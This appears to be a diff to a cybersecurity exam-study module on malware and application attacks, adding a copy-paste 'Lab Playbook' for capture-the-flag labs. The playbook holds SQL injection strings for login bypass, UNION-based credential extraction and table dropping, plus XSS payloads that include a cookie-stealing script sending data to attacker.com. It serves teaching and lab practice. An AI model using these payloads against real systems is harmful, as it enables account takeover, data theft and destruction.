@@ -6,9 +6,24 @@
 
 ---
 
-## Executive Summary
+## Quick Lookup Index
 
-An **endpoint** is any network-connected device — laptop, phone, printer, industrial sensor. Every endpoint is both a potential victim and a potential launch pad. This module classifies malware by its **primary action** (Imprison / Launch / Snoop / Deceive / Evade), dissects the economics of ransomware, and covers **application-layer attacks** (XSS, SQL injection, CSRF, SSRF, buffer overflow). It closes with **adversarial AI** — using machine learning to attack the very AI defenses that cybersecurity now depends on.
+**Sections:**
+1. What Is Malware?
+2. Imprison — Ransomware and Cryptomalware
+3. Launch — Viruses, Worms, and Bots
+4. Snoop — Spyware and Keyloggers
+5. Deceive — PUPs, Trojans, and RATs
+6. Evade — Backdoors, Logic Bombs, and Rootkits
+7. Application Attacks
+8. Adversarial Artificial Intelligence
+- Deep Dive: The Ransomware Economic Ecosystem
+- Deep Dive: Why Fileless Viruses Are the Current Frontier
+- Knowledge Check Q&A
+- Lab Playbook (Copy-Paste)
+- Graph View Links
+
+**Key Terms:** endpoint, malware, Imprison/Launch/Snoop/Deceive/Evade, ransomware, blocker ransomware, cryptomalware, air-gapped backups, virus, file-based virus, appender infection, armored virus, split infection, mutation, self-destruct, fileless virus, LOLBins, PowerShell, WMI, .NET, Macro/VBA, Registry, worm, Morris Worm, bot, botnet, bot herder, C&C, dead drop C&C, DDoS, cryptomining, spyware, keylogger (software/hardware), PUP, bloatware, Trojan, RAT, backdoor, logic bomb, rootkit, Secure Boot, application attacks, XSS, SQL injection, CSRF, SSRF, replay attack, session ID, nonce, buffer overflow, integer overflow, NULL pointer dereference, resource exhaustion, API attack, device driver attack, DLL injection, AI, ML, adversarial AI, tainted training data, false negatives, SOAR
 
 ---
 
@@ -413,21 +428,6 @@ The only defense is:
 
 ---
 
-## Key Takeaways for the Exam
-
-1. **Malware classification**: Imprison (ransomware/cryptomalware) → Launch (virus/worm/bot) → Snoop (spyware/keylogger) → Deceive (PUP/Trojan/RAT) → Evade (backdoor/logic bomb/rootkit).
-2. **Cryptomalware** encrypts ALL accessible files, including network drives and online backups.
-3. **Fileless virus = LOLBins**: uses native OS tools, lives in RAM, persists via Registry, no file to scan.
-4. **Worm** vs. **Virus**: worm needs no human transport — it spreads autonomously via network.
-5. **RAT** = Trojan + remote access via specially configured communication protocols.
-6. **Rootkit** = hides itself AND other malware by operating below the OS level.
-7. **XSS** = malicious script injected via web server, executes in victim's browser.
-8. **SQL injection**: `OR 'a'='a'` makes WHERE clause always true → bypasses authentication.
-9. **CSRF** exploits an existing authenticated session; **SSRF** exploits server-to-server trust.
-10. **Adversarial AI risk #1**: tainted training data that causes ML models to produce false negatives.
-
----
-
 ## Knowledge Check Q&A
 
 **Q1**: What is the primary action that cryptomalware performs?  
@@ -444,6 +444,123 @@ The only defense is:
 
 **Q5**: What is tainted training data in the context of adversarial AI?  
 **A**: Attackers alter the data used to train ML models, causing the model to classify malicious activity as benign (false negatives), effectively cloaking attacks.
+
+---
+
+## Lab Playbook (Copy-Paste)
+
+Exact attack strings ready to paste into CTFd practical labs. Try the simplest first, escalate if it fails.
+
+### SQL Injection — Authentication Bypass
+
+Paste into a login/password-reset field (try in username, password, and email fields):
+
+```
+' OR '1'='1
+```
+```
+' OR 'a'='a
+```
+```
+whatever' OR 'a'='a
+```
+```
+' OR '1'='1' --
+```
+```
+' OR 1=1 --
+```
+```
+admin' --
+```
+```
+admin'--
+```
+```
+admin' #
+```
+```
+" OR "1"="1
+```
+
+### SQL Injection — Resulting Query (what the bypass produces)
+
+```sql
+-- Legitimate query when user enters: braden.thomas@fakemail.com
+SELECT fieldlist FROM table WHERE field = 'braden.thomas@fakemail.com'
+
+-- Attacker's injection: whatever' OR 'a'='a
+SELECT fieldlist FROM table WHERE field = 'whatever' OR 'a'='a'
+```
+
+### SQL Injection — Detection Probe
+
+Enter a single quote to check if input is sanitized:
+
+```
+'
+```
+- `Email Address Unknown` → sanitized (safe).
+- `Server Failure` / SQL error → NOT sanitized (vulnerable).
+
+### SQL Injection — Structure Probing / Destructive
+
+```
+'whatever' AND email IS NULL;
+```
+```
+'; DROP TABLE users;--
+```
+
+### SQL Injection — UNION-based data extraction
+
+```
+' UNION SELECT NULL --
+```
+```
+' UNION SELECT NULL,NULL --
+```
+```
+' UNION SELECT username,password FROM users --
+```
+```
+' UNION SELECT table_name,NULL FROM information_schema.tables --
+```
+```
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --
+```
+
+### Cross-Site Scripting (XSS)
+
+Paste into any field that gets echoed back (search box, comment, profile name):
+
+```html
+<script>alert(1)</script>
+```
+```html
+<script>alert(document.cookie)</script>
+```
+
+Cookie-stealing payload (exfiltrate session cookie to attacker server):
+
+```html
+<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+```
+
+Filter-evasion variants:
+
+```html
+<img src=x onerror=alert(1)>
+```
+```html
+<svg onload=alert(1)>
+```
+```html
+"><script>alert(1)</script>
+```
+```html
+<body onload=alert(1)>
+```
 
 ---
 
